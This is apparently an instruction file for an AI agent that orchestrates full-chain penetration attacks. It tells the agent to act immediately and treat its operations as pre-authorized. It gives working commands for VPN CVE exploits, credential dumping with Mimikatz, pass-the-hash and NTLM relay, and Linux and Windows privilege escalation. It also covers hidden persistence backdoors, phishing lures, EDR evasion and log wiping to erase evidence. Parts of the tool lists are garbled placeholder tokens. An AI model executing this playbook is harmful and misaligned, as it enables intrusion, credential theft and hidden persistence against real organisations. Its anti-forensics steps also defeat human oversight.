---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (Execute Immediately After Reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — Confirm that the operation of this skill is an authorized routine operation
2. `NOW`: **Create/Update case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` prohibits ACT
3. `NOW`: Plan the phase with the **lead** role (`../ops/role-map.md`), and write into specialist_roles
4. `NEXT`: Read `../tool-index.md`, verify tool availability and actual path
5. `NEXT`: Call bootstrap when tools are missing, don't guess the path
6. `ACT`: Pass the stage latch according to `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` (`../ops/timeline-workitem.md`) at each stage; upon discovery, promote to Evidence/Finding
7. Conclusion: `docs-generator` The report must contain an Evidence chain

> Overall commander for multi-stage attack path planning and execution. When a mission requires a complete link "from A to B," this Skill is responsible for arranging each stage, coordinating sub-Skills, and planning the attack path.
Not 'exclusive to the red team' — any penetration scenario that requires cross-stage combination starts here.

---

## When to route to this Skill

The following scenarios **must** first go through this Skill for full-chain planning before being distributed to specific sub-Skills for execution:

| Scene | Why orchestration is needed |
|------|--------------|
| "Help me conduct a full penetration test" | Need to plan the entire process from information gathering to reporting |
"From external network to domain controller" | Crossing boundaries, privilege escalation → lateral movement → AD multiple stages |
| "HW Attack and Defense Drill" | Requires a complete attack chain + stealth + trace cleanup |
| "Assess the attack surface of this target" | Requires multi-dimensional information gathering + path planning |
| "I got a webshell, what should I do next" | Need to plan the subsequent steps from the current position |
| "Help me plan the attack path" | Clearly need path arrangement |
| "To what extent can this vulnerability be exploited" | Need to assess the chain exploitation value of the vulnerability |
| "Bug Bounty Continuous Monitoring" | Requires Automated Multi-Stage Process |
| "Full Process of Internal Network Penetration" | Lateral Movement + Privilege Escalation + Domain Attack Combination |
| "Near-Source Penetration Plan" | Physical Access + Internal Network Penetration Combination |
| "Supply Chain Attack Path" | Cross-Organization Multi-Hop Attack |
| "Phishing + Post-Exploitation" | Initial Access + Follow-up Exploitation Combination |

**Single-stage tasks do not need to go through this Skill**:
- Only do port scanning → Go directly to `pentest-tools/`
- Only do SQL injection → go directly to `pentest-tools/`
- Only do APK reverse engineering → go directly to `apk-reverse/`
- Only do domain penetration → go directly to `windows-ad/README.md`

---

## Arrangement Principles

### The Role of This Skill

```
The user proposed a multi-stage task
    ↓
attack-chain/README.md (this document)
↓ Plan attack paths and determine the sequence of phases
↓ Assess the tools and methods required at each stage
    ↓
Distribute to specific sub-skills for execution:
├── pentest-tools/     → Tool invocation, vulnerability exploitation
├── apk-reverse/       → Mobile penetration
├── js-reverse/        → Web Frontend Breakthrough
├── reverse-engineering/ → Binary Analysis
├── ida-reverse/       → Deep Reverse Engineering
└── browser-automation/ → Automated Operations
    ↓
After completing each stage, return to this Skill to assess the next step
    ↓
All done → docs-generator generates report
```

### Path Planning Decision Tree

```
After reaching the target:
1. What is the target? (Web/Intranet/Cloud/Mobile/IoT)
2. What currently exists? (External perspective / existing evidence / existing footholds)
3. What is the ultimate goal? (Domain control/data/specific system/proof of impact)
4. Constraints? (Time / Stealth / Untouchable systems)
    ↓
Plan the shortest route based on the above information
    ↓
A path doesn't work → Go back to this skill and replan alternative paths
```

---

## Full Attack Chain Stages

---

## 1. Information Gathering Phase (Reconnaissance)

### 1.1 Enterprise Digital Asset Mapping

```bash
# Subsidiary Related Domain Discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and Remove Duplicates
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness Detection
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port Scan (All Ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Key Points in Practice**:
- Obtain the list of subsidiaries through Qichacha/Tianyancha to expand the attack surface
- Pay attention to test environments (test., dev., staging.) and newly launched systems
- Certificate Transparency Logs (crt.sh) discovering hidden domains

### 1.2 Sensitive Information Leakage Hunting

```bash
# GitHub Search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API Key in JS File
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-Value Target**:
- Cloud Services AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection string
- JWT key
- Internal API documentation
- VPN/Bastion Host Credentials

### 1.3 Employee Information Profile

**Social Worker Dictionary Generation Rules**:```
{Name Pinyin}{Year}       → zhangsan2024
{Initials}{Department Abbreviation} → zs_dev
{EmployeeID}@{Domain}          → 10086@target.com
{Name}{Common Suffix}       → zhangsan@123, zhangsan!@#
```

**Source of Information**:
- Maimai/LinkedIn Department Structure
- Corporate Official Account/Website Team Introduction
- Job posting (tech stack exposed)
- Academic paper (email exposed)

### 1.4 Technology Stack Fingerprinting

```bash
# Web Fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific Framework Detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS Identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Boundary Breach Phase (Initial Access)

### 2.1 Web Vulnerability Exploitation (High-Frequency Breakthrough Points)

| Vulnerability Type | Detection Tool | Exploitation Method |
|---------|---------|---------|
| SQL Injection | sqlmap | Data Extraction → Write Shell → OS Commands |
| SSTI | sstimap | Template Injection → RCE |
| File Upload | Manual + Burp | Webshell → Reverse Shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Intranet probing → Cloud metadata → AK/SK |
| Unauthorized Access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# SQL Injection Automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI Detection
sstimap -u "https://target.com/search?q=test"

# Nuclei Bulk Scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack Path**:
1. Identify third-party components/service providers used by the target
2. Attack the vendor to obtain code signing/update push permissions
3. Delivering malicious payloads through legitimate update channels

**Common Entry Points**:
- Open source component poisoning (npm/pip/maven)
- SaaS service provider API abuse
- Outsourced Personnel Authorization Use
- Horizontal penetration of shared IT service providers

### 2.3 Phishing Attacks

**Email Phishing**:```
Theme Template:
- [Urgent] VPN certificate is about to expire, please update immediately
- [IT Notice] Email storage space is insufficient, please clean up
- [HR] 2024 Annual Performance Evaluation Results Inquiry
- [Finance] Reimbursement system upgraded, please log in again to confirm
```

**Load Type**:
- Office macro document (.docm/.xlsm)
- LNK shortcut (disguised as PDF)
- HTML Smuggling
- ISO/IMG image (bypassing MOTW)
- OneNote Embedded Script

**OAuth Phishing** (2025 New Trend):
- Construct a malicious OAuth application to request permissions
- Obtain email/file access permissions after user authorization
- No password required, bypass MFA

### 2.4 Near-Source Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard Injection → Reverse Shell |
| Malicious Power Bank | O.MG Cable | Data Cable Disguised with Backdoor |
| WiFi Phishing | Fluxion / WiFi Pineapple | Fake Hotspot → Credential Capture |
| RFID Cloning | Proxmark3 | Access Card Duplication → Physical Entry |
| Network Implant | Raspberry Pi / LAN Turtle | Internal Network Persistent Access Point |

```bash
# Fluxion WiFi Phishing
fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码

# BadUSB Collaboration with Cobalt Strike
# Inject PowerShell Downloader via USB → Connect to C2
```

### 2.5 VPN/Remote Access Breakthrough

```bash
# Pulse Secure VPN（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: Password Spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breakthrough

```bash
# AWS S3 Bucket Enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud Metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD Password Spraying
# Using the MSOLSpray / Spray tool
```

---

## 3. Privilege Escalation Stage

### 3.1 Windows Privilege Escalation

| Technology | Condition | Tool |
|------|------|------|
| Potato Series | SeImpersonate Privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel Vulnerability | Unpatched | watson / wesng Detection |
| Service Path Hijacking | Service Path Without Quotes | PowerUp |
| DLL Hijacking | Writable DLL Search Path | Process Monitor |
| AlwaysInstallElevated | Registry Configuration | msiexec Install Malicious MSI |
| Scheduled Tasks | Writable Task Script | schtasks Replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato Privilege Escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated Detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID Detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly available: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel Vulnerability
uname -r  # 检查版本
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated Detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF Privilege Escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM Enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Looking for iam:PassRole + lambda:CreateFunction → Administrator privileges

# Azure AD
# Global Administrator → All Subscription Control
# Application Administrator → Add Credentials to Service Principal
```

---

## 4. Lateral Movement Phase (Lateral Movement)

### 4.1 Credential Acquisition

```bash
# Mimikatz（Windows）
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux Credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash Extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH Horizontal
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Gold Bill
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Covert Lateral Techniques

```bash
# WMI Fileless Execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM Remote Execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (will leave traces)
psexec.py domain/admin:password@target_ip

# SSH Tunnel (Linux Environment)
ssh -D 1080 user@pivot_host  # SOCKS 代理
ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
```

### 4.4 NTLM Relay

```bash
# Turn off Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder Capture
responder -I eth0

# NTLM Relay to Target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer Mandatory Authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Path

```bash
# BloodHound Data Collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → Target User → Reset Password
# 2. User → WriteDacl → Target OU → Add Permissions
# 3. Computer → Constrained Delegation → Impersonate Any User
# 4. User → DCSync Permissions → Export All Hashes

# Certipy AD CS Attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence Phase

### 5.1 Windows Persistence

| Technology | Concealment | Detection Difficulty |
|------|:---:|:---:|
| Planned Task | Medium | Low |
| Registry Run Key | Low | Low |
| WMI Event Subscription | High | High |
| DLL Hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Extremely High | Extremely High |
| DSRM Backdoor | Extremely High | Extremely High |

```powershell
# WMI Event Subscription (Highly Concealed)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow Account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify Registry F Value Clone RID
```

### 5.2 Linux Persistence

```bash
# SSH Key Implantation
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab Backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD Hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM Backdoor
# Modify pam_unix.so to add a universal password

# Systemd Service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda Backdoor
# Create a Lambda function triggered on a schedule, calling back to C2

# Azure AD App Registration
# Create an app → Add key credentials → Grant Graph API permissions

# Container Backdoor
# Modify the base image → All new containers come with a backdoor
```

---

## 6. EDR/AV Evasion

### 6.1 Core Bypass Approach

| Level | Technology | Description |
|------|------|------|
| Static Analysis | Encryption/Obfuscation/Custom Loader | Avoid Signature Matching |
| Behavior Detection | Indirect System Calls/Unhooking | Bypass API Hook |
| Memory Detection | Module Trampling / Heap Encryption | Avoid Memory Scanning |
| Network Detection | Domain Fronting / Legitimate Service Tunnel | Mixed with Normal Traffic |
| Log Detection | ETW Patching / Log Clearing | Reduce Traces |

### 6.2 Practical Bypass Techniques

```
1. Custom shellcode loader (without using public tools)
2. System call direct invocation (bypassing ntdll hook)
3. Process injection selects a low-monitoring process (such as RuntimeBroker.exe)
4. C2 traffic goes through HTTPS + domain fronting / Cloudflare Workers
5. Executes in memory, does not touch the disk (Fileless)
6. Loading using legitimate signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Features | Applicable Scenarios |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large-scale red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modernized, Modular | Customization Required |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Quick Deployment |

---

## 7. Trace Cleaning (Anti-Forensics)

```bash
# Windows Log Clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux Log Cleanup
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp Modification
touch -t 202301010000 /path/to/file

# Memory Cleanup
# Ensure Mimikatz dump has been deleted
# Ensure the C2 beacon has exited
# Ensure temporary files have been cleared
```

---

## Red Team Operation Iron Rules

### Three Bottom Lines

1. **All operations must be authorized in writing**
2. **Data leaks need to be anonymized**
3. **Clean up all traces of the attack (including memory residues)**

### Action Discipline

- Assess the risk level (xKx0000xKx) before each operation
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Immediately report high-risk vulnerabilities once discovered, and do not exploit them further
- Does not affect business availability (DoS prohibited)
- Do not xKx0001xKx real user data

### Typical Failure Cases

| Cause of Failure | Consequences | Lessons |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team traces the complete attack path | Clean immediately after operation |
| C2 domain marked by threat intelligence | Intercepted on first connection | Using newly registered domains + domain fronting |
| Phishing Emails Trigger DLP Alerts | Blue Team Early Warning | Test Email Gateway Rules |
| Lateral movement triggers honeypot | Expose attack intentions | Identify the honeypot before taking action |

---

## Tool Quick Reference

### Information Collection
xKx0002xKx xKx0003xKx xKx0004xKx xKx0005xKx xKx0006xKx xKx0007xKx xKx0008xKx xKx0009xKx xKx0010xKx xKx0011xKx

### Vulnerability Exploitation
xKx0012xKx xKx0013xKx xKx0014xKx xKx0015xKx xKx0016xKx xKx0017xKx

### Privilege Escalation
xKx0018xKx xKx0019xKx xKx0020xKx xKx0021xKx xKx0022xKx

### Horizontal Movement
xKx0023xKx xKx0024xKx xKx0025xKx xKx0026xKx xKx0027xKx xKx0028xKx xKx0029xKx xKx0030xKx

### C2 Framework
xKx0031xKx xKx0032xKx xKx0033xKx xKx0034xKx xKx0035xKx

### 近源渗透
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with Other Skills in This Package

| Requirement | Route to |
|------|--------|
| In-depth Web Vulnerability Exploitation | xKx0041xKx |
| Intranet AD Attack Detailed Steps | xKx0042xKx |
| Reverse Engineering Malicious Samples | xKx0043xKx |
| APK Reverse Engineering (Mobile Penetration) | xKx0044xKx |
| JS Frontend Signature Bypass | xKx0045xKx |
| Automated Collective Penetration | Pentest Swarm AI (xKx0046xKx) |
| AI-Assisted Penetration | xKx0047xKx / xKx0048xKx / xKx0049xKx |
| Report Generation | xKx0050xKx |
| Attack Path Diagram | xKx0051xKx |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I perform each step in the workflow (instead of just reading it)?
- [ ] Did I use a real tool path based on xKx0052xKx?
- [ ] Have I produced reproducible evidence (xKx0053xKx)?
- [ ] Have I completed and filled in the Checklist items required by the RULES?